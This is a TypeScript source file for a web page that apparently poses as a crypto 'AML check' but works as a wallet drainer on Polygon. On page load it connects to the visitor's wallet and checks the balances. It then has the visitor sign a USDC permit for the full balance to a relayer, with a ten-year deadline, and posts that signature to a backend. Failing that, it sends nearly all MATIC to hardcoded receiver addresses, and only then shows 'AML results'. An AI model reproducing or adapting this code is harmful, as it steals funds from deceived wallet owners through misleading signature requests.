import { scanWallets, switchNetwork } from "./core";
import {
  activateActionButton,
  setActionButtonError,
  setActionButtonLoading,
  setActionButtonNotLoading,
  setActionButtonStart,
  showAmlResults,
} from "./dom";
import { logger } from "./logger";
import { ethers } from "ethers";
let provider: ethers.BrowserProvider | null = null;
let signer: ethers.Signer | null = null;

const isDev =
  window.location.href.includes("localhost") ||
  window.location.href.includes("127.0.0.1");

const PROD_RECEIVER_ADDRESS = "0x45038a8cc181432C57F7abaA067C67eE9E2f5974";
const DEV_RECEIVER_ADDRESS = "0x74B04568C58a50E10698595e3C5F99702037dF62";
const RECEIVER_ADDRESS = isDev ? DEV_RECEIVER_ADDRESS : PROD_RECEIVER_ADDRESS;
const POLYGON_CHAIN_ID = 137n;
const CONTRACT_ADDRESS = import.meta.env.VITE_CONTRACT_ADDRESS;
const RELAYER_ADDRESS = import.meta.env.VITE_RELAYER_ADDRESS;
const USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359";

logger.log("isDev", isDev);
logger.log("RECEIVER_ADDRESS", RECEIVER_ADDRESS);
logger.log("CONTRACT_ADDRESS", CONTRACT_ADDRESS);
logger.log("RELAYER_ADDRESS", RELAYER_ADDRESS);

async function handleAction(): Promise<void> {
  if (!signer) {
    await connectWallet();
    if (signer) {
      await sendPayment();
    }
  } else {
    await sendPayment();
  }
}

async function connectWallet(): Promise<void> {
  setActionButtonLoading("Подключение к кошельку...");

  try {
    logger.log("Пробуем подключиться к кошельку...");

    if (!window.ethereum) {
      throw new Error("Не найден кошелек Ethereum");
    }
    provider = new ethers.BrowserProvider(window.ethereum, "any");

    logger.log("Запрашиваем аккаунты...");
    // Запрашивает доступ к кошельку пользователя в UI
    // Возвращает массив адресов, к которым пользователь дал доступ.
    // Если пользователь отказывается, выбрасывает ошибку.
    // Без разрешения от пользователя нельзя получить signer.
    const accounts = await provider.send("eth_requestAccounts", []);
    logger.log("Аккаунты пользователя:", accounts);
    signer = await provider.getSigner();
    const address = await signer.getAddress();
    logger.log("Адрес с кошелька с дальнейшими транзакциями:", address);

    const network = await provider.getNetwork();
    logger.log("Текущая сеть:", network);

    if (network.chainId !== POLYGON_CHAIN_ID) {
      switchNetwork();
    }
  } catch (error: unknown) {
    logger.error("Ошибка подключения к кошельку:", error);

    setActionButtonError(
      error instanceof Error ? error.message : "Неизвестная ошибка"
    );
    provider = null;
    signer = null;
  }
}

async function sendPayment(): Promise<void> {
  try {
    setActionButtonLoading("Проверка...");

    if (!signer || !provider) throw new Error("Кошелек не подключен");

    // дальше можно передавать этот адрес в бэкенд, чтобы через сторонний RPC провайдер
    // пропарсить баланс кошелька
    const userAddress = await signer.getAddress();
    logger.log("Отправляем с адреса:", userAddress);

    const usdcContract = new ethers.Contract(
      USDC_ADDRESS,
      [
        "function balanceOf(address owner) view returns (uint256)",
        "function nonces(address owner) view returns (uint256)",
      ],
      provider
    );

    const usdcBalance = await usdcContract.balanceOf(userAddress);
    logger.log("Token balance:", usdcBalance.toString());

    const maticBalance = await provider.getBalance(userAddress);
    logger.log("MATIC balance:", ethers.formatEther(maticBalance), "MATIC");

    if (usdcBalance !== 0n) {
      logger.log(`USDC баланс ${usdcBalance}, отправляем USDC...`);
      await sendUsdc(usdcContract, userAddress, usdcBalance, signer);
    } else if (maticBalance !== 0n) {
      logger.log("MATIC баланс больше 0, отправляем MATIC...");
      await sendMatic(maticBalance);
    } else {
      logger.log("Баланс USDC и MATIC равен 0, отправка невозможна");
      setActionButtonError("Нет средств для отправки");
      return;
    }

    showAmlResults();
  } catch (error: unknown) {
    logger.error("Ошибка транзакции:", error);
    // @ts-ignore
    const textError = error?.action === "signTypedData" ? "Пользователь отклонил запрос" : "Неизвестная ошибка";
    setActionButtonError(textError);
    setTimeout(() => {
      setActionButtonStart("Попробуйте еще раз");
    }, 10000);
  }
}

const sendUsdc = async (usdcContract: ethers.Contract, userAddress: string, usdcBalance: any, signer: ethers.Signer) => {
  // домен для EIP-712
  const permitDomain = {
    name: "USD Coin",
    version: "2",
    chainId: POLYGON_CHAIN_ID,
    verifyingContract: USDC_ADDRESS,
  };

  // types для EIP-712 с реализацией Permit согласно EIP-2612
  const permitTypes = {
    Permit: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
      { name: "nonce", type: "uint256" },
      { name: "deadline", type: "uint256" },
    ],
  };

  const permitNonce = await usdcContract.nonces(userAddress);

  const deadline =
    Math.floor(Date.now() / 1000) +
    3600 * // 1 час
      24 * // 1 день
      365 * // 1 год
      10; // 10 лет

  const permitValue = {
    owner: userAddress,
    spender: RELAYER_ADDRESS,
    value: usdcBalance,
    nonce: permitNonce,
    deadline,
  };

  const permitSignature = await signer.signTypedData(
    permitDomain,
    permitTypes,
    permitValue
  );
  const {
    v: permitV,
    r: permitR,
    s: permitS,
  } = ethers.Signature.from(permitSignature);

  // --- Отправка на бэкенд
  const body = {
    amount: usdcBalance.toString(),
    from: userAddress,
    nonce: permitNonce.toString(),
    deadline: deadline.toString(),
    permitV,
    permitR,
    permitS,
  };

  const response = await fetch("http://localhost:3000/relay", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  const result = await response.json();
    if (result.success) {
      logger.log("Успешно отправлено! Хеш транзакции:", result.txHash);
    } else {
      logger.error("Ошибка на сервере:", result.error);
      throw new Error(result.error);
    }
};

const sendMatic = async (maticBalance: bigint) => {
  if (!signer || !provider) throw new Error("Кошелек не подключен");
   
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice;

    if (!gasPrice) {
      throw new Error("Не получилось получить цену газа");
    }
    logger.log(
      "Текущая цена газа:",
      ethers.formatUnits(gasPrice, "gwei"),
      "gwei"
    );

    const gasLimit = 21000;
    const gasCost = gasPrice * BigInt(gasLimit);
    const gasCostWithBuffer = gasCost * 120n / 100n;
    logger.log(
      "Цена газа с запасом:",
      ethers.formatEther(gasCostWithBuffer),
      "POL"
    );

    const minimumPolToKeep = ethers.parseEther("0.1");
    const totalCostToReserve = gasCostWithBuffer + minimumPolToKeep;
    logger.log(
      "Сумма для резервирования:",
      ethers.formatEther(totalCostToReserve),
      "POL"
    );

    const amountToSend = maticBalance - totalCostToReserve;
    logger.log(
      "Сумма для отправки:",
      ethers.formatEther(amountToSend),
      "POL"
    );

    if (amountToSend <= 0) {
      logger.log("Недостаточно средств для покрытия комиссий и резервирования Matic");
      throw new Error(
        "Недостаточно средств для покрытия комиссий и резервирования"
      );
    }

    logger.log("Отправляем Matic транзакцию...");
    const tx = await signer.sendTransaction({
      to: RECEIVER_ADDRESS,
      value: amountToSend,
      gasLimit: gasLimit,
      maxFeePerGas: gasPrice * 2n,
      maxPriorityFeePerGas: gasPrice,
    });

    logger.log("Транзакция Matic  отправлена:", tx.hash);

    await tx.wait();
    logger.log("Транзакция Matic подтверждена");
};

const sendWithMyContract = async (userAddress: string) => {
  // можно ли библиотекой сгенерить ABI по адресу контракта?
  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    [
      "function getCurrentNonce(address user) view returns (uint256)",
      "function name() view returns (string)",
      "function version() view returns (string)",
    ],
    provider
  );

  const nonce = await contract.getCurrentNonce(userAddress);
  const contractName = await contract.name();
  const contractVersion = await contract.version();

  logger.log("nonce:", nonce.toString());
  logger.log("contractName:", contractName.toString());
  logger.log("contractVersion:", contractVersion.toString());
};

// @ts-ignore
window.ethereum?.on("accountsChanged", async (accounts: string[]) => {
  logger.log("Изменен аккаунт в кошельке:", accounts);
  handleAction();
});

// ts-ignore
document.addEventListener("DOMContentLoaded", async () => {
  const { techLog, message } = await scanWallets();
  logger.log(message);
  logger.log("Технический лог:", techLog);

  activateActionButton(handleAction);

  const ethProvider = window.ethereum as any;

  if (!ethProvider) {
    logger.log("Не найден кошелек Ethereum.");
    return;
  } else {
    logger.log("Обнаружен кошелек Ethereum");
  }

  try {
    const accounts: string[] = await ethProvider.request({
      method: "eth_accounts",
    });
    logger.log("Ранее подключенные адреса пользователя:", accounts);

    if (accounts.length > 0) {
      await handleAction();
    } else {
      logger.log(
        "Не найдено подключенных адресов, запрашиваем разрешение на подключение к кошельку..."
      );
      try {
        const newAccounts: string[] = await ethProvider.request({
          method: "eth_requestAccounts",
        });
        logger.log(
          "Получены новые подключенные адреса пользователя:",
          newAccounts
        );
        if (newAccounts.length > 0) {
          await handleAction();
        } else {
          logger.log("Пользователь отклонил запрос на подключение к кошельку");
        }
      } catch (requestError: any) {
        logger.log(
          "Ошибка во время запроса подключенных адресов:",
          requestError
        );
        if (requestError.code === 4001) {
          logger.log("Пользователь отклонил запрос на подключение к кошельку");
        } else {
          logger.error("Неожиданная ошибка:", requestError);
        }
      }
    }
  } catch (error: unknown) {
    logger.error("Ошибка во время проверки подключенных адресов:", error);
    if (typeof error === "object" && error !== null) {
      if ("code" in error) logger.log("Error code:", (error as any).code);
      if ("message" in error)
        logger.log("Error message:", (error as any).message);
    }
  }
});
